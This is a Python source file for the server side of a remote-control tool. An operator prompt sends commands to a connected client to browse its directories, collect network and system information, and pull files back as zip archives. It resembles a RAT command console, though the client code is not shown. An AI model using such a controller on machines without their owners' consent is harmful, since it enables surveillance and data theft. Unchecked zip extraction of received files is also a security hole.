from __future__ import annotations
from protocol import PacketType, send_packet, recv_packet
from socket import create_server, gethostname, socket
from typing import Final
from pathlib import Path
import subprocess
import zipfile

class Server:
    VERSION: Final[str] = "0.0.1"

    def __init__(self, host: str = "192.168.1.129", port: int = 8080) -> None:
        self.host = host or gethostname()
        self.port = port
        self.server: socket | None = None

    def start(self) -> None:
        with create_server((self.host, self.port)) as self.server:
            print(f"Server running @ {self.host}:{self.port}")

            conn, addr = self.server.accept()

            with conn:
                print(f"{addr[0]}:{addr[1]} has connected")
                self.command_loop(conn)

    def command_loop(self, conn: socket) -> None:
        while True:
            command = input(">> ").strip()

            match command:
                case "version":
                    print(self.VERSION)

                case "view_cwd":
                    print(self.request(conn, "view_cwd"))

                case "dir":
                    print(self.request(conn, "dir"))

                case "cd":
                    print("Usage: cd <path>")

                case command if command.startswith("cd "):
                    print(self.request(conn, command))

                case command if command.startswith("download "):
                    filename = command.split(" ", 1)[1]
                    self.receive_file(conn, filename)

                case "ipconfig":
                    print(self.request(conn, "ipconfig"))

                case "specs":
                    print(self.request(conn, "specs"))

                case "systeminfo":
                    print(self.request(conn, "systeminfo"))

                case "clear":
                    subprocess.run("cls", shell=True)

                case "help":
                    self.show_help()

                case "exit" | "quit":
                    print("Shutting down...")
                    break

                case "":
                    continue

                case _:
                    print("Unknown command")

    def receive_file(self, conn: socket, filename: str) -> None:
        packet_type, data = recv_packet(conn)

        if packet_type != PacketType.FILE:
            print("Expected file")
            return

        zip_path = Path(f"received_{Path(filename).name}")

        with open(zip_path, "wb") as file:
            file.write(data)

        print(f"Received: {zip_path}")

        extract_path = zip_path.with_suffix("")

        with zipfile.ZipFile(zip_path) as zip_file:
            zip_file.extractall(extract_path)

        print(f"Extracted to: {extract_path}")

    def request(self, conn: socket, command: str) -> str:
        conn.sendall(command.encode())
        data = b""

        while b"<END>" not in data:
            chunk = conn.recv(4096)
            if not chunk:
                raise ConnectionError("Client disconnected")
            data += chunk

        return data.replace(b"<END>", b"").decode(errors="replace")
    
    @staticmethod
    def show_help() -> None:
        print(
            """Available commands:
    version            - Show server version
    view_cwd           - Show client's current directory
    dir                - List files
    cd <path>          - Change directory
    ipconfig           - Show network configuration
    specs              - Show hardware specifications
    systeminfo         - Show Windows system information
    clear              - Clear console
    help               - Show help
    exit / quit        - Shut down"""
        )

def main() -> None:
    Server().start()

if __name__ == "__main__":
    main()